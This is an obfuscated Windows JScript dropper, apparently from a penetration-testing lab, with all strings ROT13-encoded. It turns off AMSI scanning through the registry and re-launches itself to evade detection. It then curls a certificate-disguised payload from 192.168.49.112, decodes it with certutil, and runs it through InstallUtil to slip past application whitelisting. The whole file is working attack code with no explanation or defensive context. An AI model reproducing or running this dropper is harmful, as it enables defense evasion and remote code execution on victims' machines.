// echo -e "-----BEGIN CERTIFICATE-----\n$(base64 main.exe -w 64)\n-----END CERTIFICATE-----" > main.txt

var alph = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".split("");
var ralph = "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm".split("");

function decrypt(enc) {
  enc = enc.split("");
  for (var x = 0; x < enc.length; x++) {
    for (var y = 0; y < alph.length; y++) {
      if (enc[x] == alph[y]) {
        enc[x] = ralph[y];
        break;
      }
    }
  }
  return enc.join("");
}

var sh = new ActiveXObject(decrypt("Jfpevcg.furyy"));
var key = decrypt("UXPH\\Fbsgjner\\Zvpebfbsg\\Jvaqbjf Fpevcg\\Frggvatf\\NzfvRanoyr");
try {
  var AmsiEnable = sh.RegRead(key);
  if (AmsiEnable != 0) {
    throw new Error(1, "");
  }
} catch (e) {
  sh.RegWrite(key, 0, decrypt("ERT_QJBEQ"));
  sh.Run(decrypt("pfpevcg -r:{S414P262-6NP0-11PS-O6Q1-00NN00OOOO58} ") + WScript.ScriptFullName, 0, 1);
  sh.RegWrite(key, 1, decrypt("ERT_QJBEQ"));
  WScript.Quit(1);
}

cmd1 = decrypt("pzq /p qry P:\\Jvaqbjf\\Gnfxf\\znva.*");
cmd2 = decrypt("phey uggc://192.168.49.112/znva.gkg -b P:\\Jvaqbjf\\Gnfxf\\znva.gkg");
cmd3 = decrypt("preghgvy -qrpbqr P:\\Jvaqbjf\\Gnfxf\\znva.gkg P:\\Jvaqbjf\\Gnfxf\\znva.rkr");
cmd4 = decrypt("P:\\Jvaqbjf\\Zvpebfbsg.ARG\\Senzrjbex64\\i4.0.30319\\VafgnyyHgvy.rkr");
cmd4 += decrypt(" /ybtsvyr= /YbtGbPbafbyr=snyfr /H P:\\Jvaqbjf\\Gnfxf\\znva.rkr");

sh.Run(cmd1, 0, true);
sh.Run(cmd2, 0, true);
sh.Run(cmd3, 0, true);
sh.Run(cmd4, 0, true);
